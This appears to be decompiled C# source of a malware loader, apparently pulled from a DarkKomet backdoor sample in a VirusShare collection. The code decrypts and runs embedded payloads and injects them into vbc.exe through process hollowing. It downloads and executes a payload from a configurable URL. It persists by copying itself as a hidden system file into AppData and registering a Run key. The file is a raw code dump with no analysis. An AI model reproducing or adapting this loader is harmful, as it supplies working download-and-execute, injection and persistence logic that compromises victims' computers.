// Decompiled with JetBrains decompiler
// Type: LOl
// Assembly: DEECDF, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 641CAFA7-4057-442D-8D3F-99927627E003
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.aaqd-09225744ccf3bb45d0baa0d18af92c49a6dee7af3ced76f52efa500266c47656.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class LOl
{
  public static ResourceManager Rrr = new ResourceManager("MyResources", Assembly.GetExecutingAssembly());
  public static string fpath;
  public static string fpath1;
  private static FileAttributes FA = FileAttributes.Hidden | FileAttributes.System;
  private static string regkeyname = "RegKeyName";
  private static string url = "DownloadURL";
  private static string os = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE", EnvironmentVariableTarget.Machine);
  public static string notepd = "";

  [STAThread]
  public static void Main()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      LOl.fpath = RuntimeEnvironment.GetRuntimeDirectory() + "vbc.exe";
label_2:
      num3 = 3;
      LOl.fpath1 = LOl.defaultbrowser();
label_3:
      num3 = 4;
      Thread thread1 = new Thread(new ThreadStart(LOl.mainexecute));
label_4:
      num3 = 5;
      thread1.Start();
label_5:
      num3 = 6;
      string executablePath = Application.ExecutablePath;
label_6:
      num3 = 7;
      if (executablePath.Contains("AppData\\Roaming\\"))
        goto label_16;
label_7:
      num3 = 10;
      Thread thread2 = new Thread(new ThreadStart(LOl.startup));
label_8:
      num3 = 11;
      Thread thread3 = new Thread(new ThreadStart(LOl.downloader));
label_9:
      num3 = 12;
      Thread thread4 = new Thread(new ThreadStart(LOl.binderexecute));
      goto label_16;
label_11:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
            case 13:
              goto label_16;
            case 9:
            case 10:
              goto label_7;
            case 11:
              goto label_8;
            case 12:
              goto label_9;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_11;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_16:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static string defaultbrowser() => Strings.Split(Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object) "Not Found")), "\"")[1];

  public static void mainexecute()
  {
    try
    {
      byte[] numArray = (byte[]) LOl.Rrr.GetObject("A");
      if (LOl.DotNetDetected(numArray))
        LOl.DoExecute(numArray);
      else if (LOl.os.Contains("64"))
        RunPE.InjectPE(numArray, LOl.fpath);
      else
        RunPE.InjectPE(numArray, LOl.fpath);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void binderexecute()
  {
    try
    {
      byte[] numArray = (byte[]) LOl.Rrr.GetObject("B");
      if (LOl.DotNetDetected(numArray))
        LOl.DoExecute(numArray);
      else if (LOl.os.Contains("64"))
        RunPE.InjectPE(numArray, LOl.fpath);
      else
        RunPE.InjectPE(numArray, LOl.fpath);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void downloader()
  {
    try
    {
      byte[] numArray = new WebClient().DownloadData(LOl.url);
      if (LOl.DotNetDetected(numArray))
        LOl.DoExecute(numArray);
      else if (IntPtr.Size == 4)
      {
        RunPE.InjectPE(numArray, LOl.fpath);
      }
      else
      {
        if (IntPtr.Size != 8)
          return;
        RunPE.InjectPE(numArray, LOl.fpath);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void DoExecute(byte[] d)
  {
    if (d[60] != (byte) 128)
      return;
    MethodInfo entryPoint = Assembly.Load(d).EntryPoint;
    object[] parameters = (object[]) null;
    if (entryPoint.GetParameters().Length > 0)
      parameters = new object[1]
      {
        (object) new string[1]{ "1" }
      };
    entryPoint.Invoke((object) null, parameters);
    Application.Exit();
  }

  public static bool DotNetDetected(byte[] FileBytes)
  {
    bool flag;
    try
    {
      Assembly.Load(FileBytes);
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void startup()
  {
    string str1 = Path.GetTempPath() + "";
    string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + LOl.random_letter_string(3, 10) + ".exe";
    try
    {
      System.IO.File.Copy(Application.ExecutablePath, str2, true);
      System.IO.File.SetAttributes(str2, LOl.FA);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      object Instance1 = (object) Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      object Instance2 = Instance1;
      object[] objArray1 = new object[2]
      {
        (object) LOl.regkeyname,
        (object) str2
      };
      object[] Arguments1 = objArray1;
      bool[] flagArray1 = new bool[2]{ true, true };
      bool[] CopyBack1 = flagArray1;
      NewLateBinding.LateCall(Instance2, (System.Type) null, "SetValue", Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
      if (flagArray1[0])
        LOl.regkeyname = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (string));
      if (flagArray1[1])
      {
        string str3 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[1]), typeof (string));
      }
      object Instance3 = Instance1;
      object[] objArray2 = new object[2]
      {
        (object) LOl.regkeyname,
        (object) RegistryKeyPermissionCheck.ReadWriteSubTree
      };
      object[] Arguments2 = objArray2;
      bool[] flagArray2 = new bool[2]{ true, false };
      bool[] CopyBack2 = flagArray2;
      NewLateBinding.LateCall(Instance3, (System.Type) null, "CreateSubKey", Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
      if (flagArray2[0])
        LOl.regkeyname = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (string));
      NewLateBinding.LateCall(Instance1, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static string random_letter_string(int min, int max)
  {
    Random random = new Random();
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = random.Next(min, max);
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      Thread.Sleep(Conversions.ToInteger("1"));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
